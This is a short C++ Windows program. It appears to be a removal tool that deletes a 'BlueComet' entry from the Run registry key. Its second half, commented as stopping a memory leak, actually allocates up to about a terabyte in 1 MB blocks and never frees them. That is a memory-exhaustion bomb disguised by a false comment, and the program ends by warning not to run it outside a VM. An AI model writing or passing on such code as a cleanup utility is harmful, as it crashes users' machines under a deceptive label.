/*


__  __   ______  ______  ______  ______    
/\ \/ /  /\  __ \/\  == \/\  __ \/\  __ \   
\ \  _"-.\ \  __ \ \  _-/\ \ \/\ \ \ \/\ \  
 \ \_\ \_\\ \_\ \_\ \_\   \ \_____\ \_____\ 
  \/_/\/_/ \/_/\/_/\/_/    \/_____/\/_____/ 



*/



#include <iostream>
#include <Windows.h>
#pragma comment(lib, "Advapi32.lib")

int main() {
    /* Remove BlueComet from the registry */
    LONG result = RegDeleteValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "BlueComet");
    if (result == ERROR_SUCCESS) {
        std::cout << "BlueComet removed from registry." << std::endl;
    } else {
        std::cout << "BlueComet is persistent or unavailable to remove. Is this source code modified?" << std::endl;
    }

    /* Stop the memory leak */
    for (int j = 0; j < 1024 * 1024; j++) { // add 1 MB of binary for each loop j
        char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
        memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
    }
    std::cout << "Congrats. Don't run this outside of VM." << std::endl;

    return 0;
}
